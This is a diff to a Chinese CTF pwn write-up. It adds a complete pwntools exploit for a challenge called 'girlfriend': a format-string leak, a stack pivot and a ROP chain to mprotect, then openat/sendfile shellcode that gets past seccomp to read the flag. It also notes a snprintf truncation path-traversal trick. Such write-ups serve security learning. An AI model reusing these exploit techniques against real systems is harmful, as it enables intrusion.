@@ -26,7 +26,6 @@ from pwn import *
 from LibcSearcher import *  
 context(arch='amd64', os='linux', log_level='debug')  
   
-local = 1  
 binary_path = './attachment'  
 gdb_script = "b *0x401180\n"  
 #gdb_script += "b *0x401261\n"  
@@ -114,6 +113,10 @@ if __name__ == '__main__':
             continue
 ```
 
+刷新缓冲区：fflush、打满缓冲区、重新调用setvbuf
+
+除此之外有师傅发现了通过打fgetc和IO的方式刷新缓冲区，由于我对IO利用还不太熟练，于是插个眼，半个月后再回来看。
+
 ### girlfriend
 
 有`fmt`，一次就能泄露libc、canary以及pie，剩下绕过沙盒理应很简单，但是我做题的时候根本没有Libc文件，找也找不到，于是作罢
@@ -129,6 +132,123 @@ GCC: (Ubuntu 10.5.0-1ubuntu1~22.04) 10.5.0
 
 从Ubuntu 22.04可以确定大致的libc版本，由于题是这段时间出的，所以直接找22.04最新的修订版libc就行
 
+后面绕过seccomp就简单了，我习惯的是打mprotect + shellcode
+
+```python
+from pwn import *
+from LibcSearcher import *
+context(arch='amd64', os='linux', log_level='debug')
+
+local = 1
+binary_path = './pwn'
+gdb_script = "\n"
+gdb_script += "b *$rebase(0x1676)\n"
+#gdb_script += "b *$rebase(0x1708)\n"
+#gdb_script += "b *$rebase(0x15c9)\n"
+gdb_script += "c\n"
+domain = "gz.imxbt.cn"
+port = 20110
+global io, gdb_io
+elf = ELF(binary_path)
+libc = ELF('./libc.so.6')
+
+def connect(isLocal, isGDB, isIO):
+    if not isLocal:
+        io = remote(domain, port)
+        return io
+    elif isGDB:
+        if isIO:
+            io = process(binary_path)
+            (pid, gdb_io) = gdb.attach(io, gdb_script, api=True)
+            return io, gdb_io
+        else:
+            io = gdb.debug(binary_path, gdb_script)
+            return io
+    else:
+        io = process(binary_path)
+        return io
+
+def attack(io):
+    io.sendafter(b"Choice:", str(3))
+    fmt = "%7$p%3$p%15$p"
+    io.sendafter(b"You should tell her your name first\n", fmt)
+    io.recvuntil(b"your name:\n")
+    leak_pie_addr = eval(io.recv(14))
+    leak_write_addr = eval(io.recv(14)) - 23
+    canary = eval(io.recv(18))
+    pie = leak_pie_addr - (0x5fab223318d9-0x5fab22330000)
+    log.success(f"Pie: {hex(pie)}")
+    log.success(f"write: {hex(leak_write_addr)}")
+    log.success(f"canary: {hex(canary)}")
+    
+    libc_base = leak_write_addr - libc.sym['write']
+    print(hex(libc_base))
+    pop_rdi = libc_base + libc.search(asm('pop rdi ; ret')).__next__()
+    log.success(f"pop_rdi: {hex(pop_rdi)}")
+    pop_rsi = libc_base + libc.search(asm('pop rsi ; ret')).__next__()
+    log.success(f"pop_rsi: {hex(pop_rsi)}")
+    pop_rdx = libc_base + 0x904a9
+    log.success(f"pop_rdx: {hex(pop_rdx)}")
+    shellcode_start = pie + 0x4500
+    mprotect = libc_base + libc.sym['mprotect']
+    read = libc_base + libc.sym['read']
+    pop_rbx = libc_base + 0x35dd1
+
+    io.sendafter(b"Choice:", str(3))
+    new_rbp = pie+0x4300
+    payload = p64(new_rbp) 
+    payload += p64(pop_rdi) + p64((shellcode_start>>12)<<12)
+    payload += p64(pop_rsi) + p64(0x1000)
+    payload += p64(pop_rbx) + p64(0)
+    payload += p64(pop_rdx) + p64(7)
+    payload += p64(0)
+    payload += p64(mprotect)
+    payload += p64(pop_rdi) + p64(0)
+    payload += p64(pop_rsi) + p64(shellcode_start)
+    payload += p64(pop_rdx) + p64(0x1000)
+    payload += p64(0)
+    payload += p64(read)
+    payload += p64(shellcode_start)
+    io.sendafter(b"You should tell her your name first\n", payload)
+    io.recvuntil(b"Good luck!\n")
+    #prepare before stack leave_ret
+
+    io.sendafter(b"Choice:", str(1))
+    leave_ret = pie + 0x14f4
+    payload = cyclic(0x38) + p64(canary) + p64(pie+0x4060) + p64(leave_ret)
+    io.sendafter(b"what do you want to say to her?", payload)
+    #leave_ret
+    
+    io.recvuntil(b"but she left.........\n")
+    shellcode = """
+        mov rbx,0x67616C662F;
+        push rbx;
+        mov rsi,rsp;
+        push 0;
+        pop rdi;
+        push 0;
+        pop rdx;
+        push 257;
+        pop rax;
+        syscall;
+        mov rdi,1;
+        mov rsi,3;
+        mov rdx,0;
+        mov r10,0x100;
+        mov rax,40;
+        syscall;
+    """
+    io.sendline(asm(shellcode))
+    io.interactive()
+if __name__ == '__main__':
+    io = connect(False, True, False)
+    attack(io)
+
+```
+
+> [!note] 总结
+> - 绕过open使用openat
+> - 绕过read/write使用sendfile，注意sendfile的count参数使用寄存器r10
 
 
 ### 明日方舟寻访模拟器
@@ -140,7 +260,6 @@ from pwn import *
 from LibcSearcher import *  
 context(arch='amd64', os='linux', log_level='debug')  
   
-local = 1  
 binary_path = './pwn'  
 gdb_script = "b *0x401877\n"  
 gdb_script += "b *0x4018e5\n"  
@@ -208,6 +327,8 @@ if __name__ == '__main__':
 看别人WP说是能够进行`\x00`截断，我确实也考虑过这个方向，但是了解到加密算法能够直接破解就没管了
 
 后续就是由于文件名后缀的`.dat`无法绕过，卡了一会儿，但是试了`/../../../flag`莫名其妙就出了
+
+后续知道，是因为`snprintf`函数限定了size，超过size的字符串会被截断，于是`.dat`后缀被截断掉了
 
 ### 奶龙回家
 
